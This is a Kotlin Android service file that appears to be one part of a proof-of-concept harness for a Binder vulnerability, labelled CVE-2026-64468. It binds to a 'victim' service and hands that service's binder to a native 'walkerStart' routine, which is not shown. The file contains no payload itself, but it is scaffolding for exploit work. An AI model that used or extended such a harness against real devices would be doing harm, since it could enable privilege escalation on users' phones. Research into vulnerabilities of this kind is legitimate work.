package org.opencrown.binderprobe

import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Binder
import android.os.IBinder
import android.os.Process
import android.util.Log

/** B in the CVE-2026-64468 topology: owns the transaction stacks. */
class WalkerService : Service() {
    private var victim: IBinder? = null
    private val binder = Binder()

    private val connection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName, service: IBinder) {
            victim = service
            Log.i("BinderHarness", "walker connected to victim")
            Thread {
                try {
                    Thread.sleep(750)
                    val data = BinderNative.nativeData(service)
                    val result = HarnessNative.walkerStart(data, 16)
                    Log.i("BinderHarness", "walkerStart result=$result")
                } catch (error: Throwable) {
                    Log.e("BinderHarness", "walker start failed: $error")
                }
            }.start()
        }

        override fun onServiceDisconnected(name: ComponentName) {
            victim = null
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.i("BinderHarness", "walker pid=${Process.myPid()}")
        bindService(Intent(this, VictimService::class.java), connection, Context.BIND_AUTO_CREATE)
    }

    override fun onBind(intent: Intent?): IBinder = binder
}
